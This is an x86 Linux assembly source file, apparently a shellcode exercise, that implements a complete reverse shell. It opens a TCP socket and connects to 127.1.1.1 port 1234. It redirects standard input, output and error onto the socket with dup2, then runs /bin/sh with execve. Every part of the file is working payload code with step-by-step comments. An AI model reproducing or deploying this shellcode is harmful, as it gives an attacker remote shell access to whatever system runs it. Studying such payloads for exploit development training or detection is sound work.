global _start

section .text
_start:

	
	; Create the socket

	push 0x66 		; 
	pop eax			; socketcall (102) and clean eax
	push 0x1		;
	pop ebx			; SYS_SOCKET (1) and clean ebx
	xor ecx, ecx		; zero out ecx
	push ecx		; protocol (0)
	push ebx		; SOCK_STREAM (1)
	push 0x2		; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	int 0x80		; execute socket

	mov edi, eax		; move socket to edi


	; Connect to an IP and port

	
	mov al, 0x66		; socketcall (102)
	pop ebx			; (2)
	push 0x0101017f		; s_addr = 127.1.1.1 
	push word 0xd204	; sin_port = 1234
	push bx			; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	push 0x10		; sizeof(host_addr)
	push ecx		; pointer to host_addr struct
	push edi		; socketfd
	mov ecx, esp		; point ecx to top of stack 
	inc ebx			; SYS_CONNECT (3)
	int 0x80		; execute connect
	

	; Redirect STDIN, STDERR, STDOUT

	xchg ebx, edi           ; move socketfd into ebx for dup2
	push 0x2
	pop ecx			; zero out ecx
	
loop:
	mov al, 0x3f		; dup2 (63)
	int 0x80		; exec dup2
	dec ecx			; decrement counter
	jns loop		; jump until SF is set

	; Execute /bin/sh
	
	xor edx, edx		; zero out edx
	push edx		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f 	; "nib/"
	mov ebx, esp		; point ebx to stack
	mov ecx, edx		; NULL
	mov al, 0xb		; execve
	int 0x80		; execute execve


	
